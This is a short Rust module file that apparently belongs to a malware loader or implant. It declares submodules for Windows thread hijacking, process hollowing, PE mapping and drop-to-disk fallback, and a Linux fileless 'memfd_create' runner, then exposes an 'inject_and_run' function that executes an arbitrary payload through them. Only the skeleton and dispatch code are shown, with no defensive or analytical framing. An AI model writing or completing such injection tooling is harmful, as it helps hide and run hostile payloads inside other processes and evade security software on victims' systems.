//! Injection module — Windows: WTH -> hollow -> drop-to-disk.
//! Linux: memfd_create fileless (unchanged from S5).

#[cfg(windows)] pub(crate) mod winapi;
#[cfg(windows)] pub mod pe_map;
pub mod stub;
#[cfg(windows)] pub mod wth;
#[cfg(windows)] pub mod hollow;
#[cfg(windows)] mod windows;
#[cfg(unix)]    mod linux;

use thiserror::Error;

#[derive(Debug, Error)]
pub enum InjectionError {
    #[error("target process not found")]   ProcessNotFound,
    #[error("open failed: {0}")]           OpenFailed(String),
    #[error("alloc failed: {0}")]          AllocFailed(String),
    #[error("write failed: {0}")]          WriteFailed(String),
    #[error("thread op failed: {0}")]      ThreadFailed(String),
    #[error("run failed: {0}")]            RunFailed(String),
    #[allow(dead_code)]
    #[error("not implemented: {0}")]       NotImplemented(String),
}

pub fn inject_and_run(payload: &[u8]) -> Result<(), InjectionError> {
    #[cfg(windows)] { windows::inject_with_fallback(payload) }
    #[cfg(unix)]    { linux::run_fileless(payload) }
}
